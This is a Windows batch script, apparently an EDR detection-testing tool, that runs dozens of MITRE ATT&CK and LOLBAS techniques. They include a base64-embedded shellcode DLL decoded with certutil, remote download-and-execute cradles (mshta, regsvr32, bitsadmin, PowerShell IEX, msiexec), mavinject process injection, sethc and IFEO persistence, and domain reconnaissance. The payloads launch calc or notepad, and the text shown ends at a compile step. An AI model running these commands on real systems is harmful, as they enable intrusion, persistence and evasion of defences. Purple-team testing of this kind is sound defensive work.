REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries
REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
REM Author: op7ic
REM Description:
REM Test the detection of various scripts/downloads/execs against your EDR solution.
REM
REM Warning:
REM You might have to click on few windows to close script execution. Don't run this on live system instead run this in a VM with EDR installed!
REM
REM Version: 0.4a
REM
REM Version History:
REM 0.4a - Added Invoke-CradleCrafter payloads
REM 0.3a - More LOLBAS checks 
REM 0.2a - More ATT&CK / LOLBAS checks
REM      - Mapped out available tests in README.md
REM 0.1a - Basic ATT&CK / LOLBAS checks addded



echo **********************************************
echo *          EDR Testing Script                *
echo *          Version: 0.4a                     *
echo *          author: op7ic                     *
echo *                                            *
echo *                                            *
echo *                                            *
echo **********************************************

echo [+] Starting script execution at %time% %date%
echo %time% %date%: [+] Dumping DLL file which runs calc.exe (x86)
REM - DLL taken from https://github.com/peterferrie/win-exec-calc-shellcode
echo -----BEGIN CERTIFICATE----- > fi.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> fi.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACpUmPY7TMNi+0zDYvtMw2L >> fi.b64
echo i93Di+wzDYvtMw2L7DMNiy07RIvsMw2LLTtKi+wzDYtSaWNo7TMNiwAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQMAwd7lUgAAAAAAAAAA4AAOIQsBBwoAAgAA >> fi.b64
echo AAQAAAAAAAAAEAAAABAAAAAgAAAAAAAQABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA >> fi.b64
echo AEAAAAAEAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAgAABYAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABdAAAAABAAAAACAAAABAAA >> fi.b64
echo AAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAWAAAAAAgAAAAAgAAAAYAAAAAAAAAAAAA >> fi.b64
echo AAAAAEAAAEAucmVsb2MAAAgAAAAAMAAAAAIAAAAIAAAAAAAAAAAAAAAAAABAAABC >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFWL7OgIAAAAM8BdwgwAzMxgMdJSaGNhbGNUWVJRZIty >> fi.b64
echo MIt2DIt2DK2LMIt+GItfPItcH3iLdB8gAf6LVB8kD7csF0JCrYE8B1dpbkV18It0 >> fi.b64
echo HxwB/gM8rv/XWFhhwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAMHe5VIAAAAAMiAAAAEAAAABAAAAAQAAACggAAAsIAAAMCAAAAAQAABMIAAA >> fi.b64
echo AAB3MzItZGxsLXJ1bi1zaGVsbGNvZGUuZGxsAF9EbGxNYWluQDEyAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAA== >> fi.b64
echo -----END CERTIFICATE----- >> fi.b64

echo **********************************************
echo *      Testing Mitre ATT&CK PAYLOADS         *
echo **********************************************

echo %time% %date%: [+] T1140 - Decoding AllTheThings.dll file with Certutil
start "" cmd /c certutil -f -decode fi.b64 AllTheThings.dll >nul
echo Command Excuted: certutil -f -decode fi.b64 AllTheThings.dll

timeout 5

echo %time% %date% [+] T1197 - Testing bitsadmin download
start "" cmd /c bitsadmin.exe /transfer "JobName" https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt "%cd%\Default_File_Path.ps1"
echo Execution Finished at %time% %date%
echo Command Excuted: bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
start "" cmd /c powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Command Excuted:powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Execution Finished at %time% %date%

timeout 5

echo %time% %date% [+] T1118 - Testing InstallUtil x86"
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
timeout 5

echo %time% %date% [+] T1118 - Testing InstallUtil x64
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

timeout 5

echo %time% %date% [+] T1170 - Testing mshtha
start "" cmd /c mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
timeout 5

echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
start "" cmd /c powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
timeout 5


echo %time% %date% [+] T1121 - Testing regsvcs
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

timeout 5

echo %time% %date% [+] T1121 - Testing regasm
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll

timeout 5

echo %time% %date% [+] T1121 - Testing regasm x64
start "" cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

timeout 5

echo %time% %date% [+] T1117 -  Testing regsvr32
start "" cmd /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
echo Execution Finished at %time% %date%
echo Command Excuted: regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll

timeout 5

echo %time% %date% [+] T1127 - Testing MSBuild

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" cmd /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

timeout 5

echo %time% %date% [+] T1047 - Testing wmic download
start "" cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
echo Execution Finished at %time% %date%
echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"

timeout 5

echo %time% %date% [+] T1128 - Testing netsh.exe dll exec 
start "" cmd /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
start "" cmd /c netsh trace show status    
start "" cmd /c netsh.exe add helper AllTheThings.dll
start "" cmd /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
start "" cmd /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
start "" cmd /c netsh trace stop
echo Execution Finished at %time% %date%
echo Command Excuted: netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
echo Command Excuted: netsh trace show status 
echo Command Excuted: netsh.exe add helper AllTheThings.dll
echo Command Excuted: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
echo Command Excuted: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
echo Command Excuted: netsh trace stop

timeout 5
 
echo %time% %date% [+] T1085 - Testing rundll32 execution
start "" cmd /c rundll32 AllTheThings.dll,EntryPoint
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32 AllTheThings.dll,EntryPoint

timeout 5

echo %time% %date% [+] T1085 - Testing rundll32 download & exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")

timeout 5

echo %time% %date% [+] T1085 - Testing rundll32 exec
start "" cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
timeout 5

echo %time% %date% [+] T1130 - Testing certutil download 
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  
echo Execution Finished at %time% %date%
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1
timeout 5

echo %time% %date% [+] T1191 - Testing cmstp download
start "" cmd /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
echo Execution Finished at %time% %date%
echo Command Excuted: cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
timeout 5
echo %time% %date% [+] T1202 - Indirect Command Execution
start "" cmd /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
timeout 5
echo %time% %date% [+] T1028 - Testing Windows Remoting exec
start "" cmd /c winrm qc -q 
start "" cmd /c winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
echo Execution Finished at %time% %date%
echo Command Excuted: winrm qc -q 
echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
timeout 5
echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System" /f
echo Execution Finished at %time% %date%
echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
timeout 5
echo %time% %date% [+] T1216 - Signed Script Proxy Execution
start "" cmd /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
echo Execution Finished at %time% %date%
echo Command Excuted: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
timeout 5
echo %time% %date% [+] T1218 / T1055 - Signed Binary Proxy Execution
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted: for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
start "" cmd /c  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted:  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Execution Finished at %time% %date%
timeout 5
echo %time% %date% [+] T1033 - System Owner/User Discovery
start "" cmd.exe /c whoami
start "" wmic useraccount get /ALL
start "" cmd.exe /c net group "domain administrators" /domain
start "" cmd.exe /c whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1
echo Execution Finished at %time% %date%
echo Command Excuted: cmd.exe /C whoami
echo Command Excuted: wmic useraccount get /ALL
echo Command Excuted: cmd.exe /C net group "domain administrators" /domain

timeout 5
echo %time% %date% [+] T1158 - Hiding data in ADS
echo "test123 > 12.txt
echo "test" > 12.txt:12
echo Execution Finished at %time% %date%
echo Command Excuted: echo "test123 > 12.txt
echo Command Excuted: echo "test123 > 12.txt
timeout 5
echo %time% %date% [+] T1183 - Exec via File Execution Options

start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "C:\windows\system32\calc.exe"
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 
start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "C:\windows\system32\calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "calc.exe"
timeout 5
echo %time% %date% [+] T1096 - NTFS File Attributes
type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
echo Execution Finished at %time% %date%
echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
timeout 5

echo %time% %date% [+] T1015 - Sethc replacement
copy /Y C:\windows\system32\sethc.exe C:\windows\system32\sethc.bac
copy /Y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
copy /Y C:\windows\system32\sethc.bac C:\windows\system32\sethc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: C:\windows\system32\setsh.exe C:\windows\system32\setsh.bac
echo Command Excuted: C:\windows\system32\cmd.exe C:\windows\system32\setsh.exe
echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.exe

timeout 5


echo **********************************************
echo *      Testing LOLBAS PAYLOADS               *
echo **********************************************
REM Payloads in this section were generated based on information in https://github.com/api0cradle/LOLBAS

echo %time% %date% [+] Testing msiexec exec
start "" cmd /c msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
start "" cmd /c msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
echo Execution Finished at %time% %date%
echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
timeout 5
echo %time% %date% [+] Testing diskshadow exec
echo exec calc.exe > diskshadow.txt
start "" cmd /c  diskshadow.exe /s diskshadow.txt
echo Execution Finished at %time% %date%  
echo Command Excuted: exec calc.exe > diskshadow.txt
echo Command Excuted: diskshadow.exe /s diskshadow.txt
timeout 5
echo %time% %date% [+] Testing Esentutl.exe download & exec
start "" cmd /c  esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
start "" cmd /c  adrestore.exe   
echo Execution Finished at %time% %date%  
echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
echo Command Excuted: adrestore.exe
timeout 5
echo %time% %date% [+] Testing replace.exe download & exec
start "" cmd /c replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
start "" cmd /c adrestore2.exe   
echo Execution Finished at %time% %date% 
echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
echo Command Excuted: adrestore2.exe  
timeout 5
echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
start "" cmd /c  C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date% 
echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
timeout 5
echo %time% %date% [+] Testing HH.exe download
REM HH.exe does not handle HTTPS
start "" cmd /c  HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
echo Execution Finished at %time% %date% 
echo Command Excuted: HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
timeout 5
echo %time% %date% Testing ieexec.exe download & execute"exec"
start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
echo Execution Finished at %time% %date% 
echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
timeout 5
echo %time% %date% [+] Testing Setupapi driever installation & exec
echo ^; DRIVER.INF > calc.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
echo [Version] >> calc.inf
echo Signature = "$CHICAGO$" >> calc.inf
echo Class=61883 >> calc.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
echo Provider=%Msft% >> calc.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
echo [DestinationDirs] >> calc.inf
echo DefaultDestDir = 1 >> calc.inf
echo [DefaultInstall] >> calc.inf
echo AddReg = CalcStart >> calc.inf
echo [CalcStart]
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf

start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
echo Execution Finished at %time% %date% 
echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
timeout 5

echo %time% %date% [+] Testing Shdocvw exec via rundll32
echo [InternetShortcut] > C:\windows\temp\url.url
echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
start "" cmd /c rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
echo Execution Finished at %time% %date%
echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
timeout 5

echo %time% %date% [+] Testing csc exec

echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs

start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
